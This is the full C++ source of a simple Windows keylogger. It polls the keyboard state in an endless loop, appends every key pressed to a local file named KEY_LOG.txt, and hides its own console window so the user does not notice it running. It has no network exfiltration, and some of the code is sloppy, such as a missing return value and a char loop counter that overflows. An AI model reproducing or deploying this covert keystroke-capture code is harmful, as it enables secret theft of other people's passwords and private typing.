#include <iostream>
#include <Windows.h>
#include <fstream>
#include <winuser.h>

using namespace std;

int log(int key_stroke);
void hide();

int main()
    {
       hide();
        while(1)
            {

                for(char i=8;i<255;i++)
                {
                    if(GetAsyncKeyState(i) == -32767)
                    {
                        log(i);
                    }
                }
            }

        return 0;
    }

int log(int key_stroke)
    {
       cout<<key_stroke<<endl;
       fstream file;
       file.open("KEY_LOG.txt",ios::app);
       file<<(char)key_stroke;
       file.close();
    }
void hide()
{
HWND consoleWindow;
AllocConsole();
consoleWindow= FindWindowA("ConsoleWindowClass", NULL);
ShowWindow(consoleWindow,0);
}


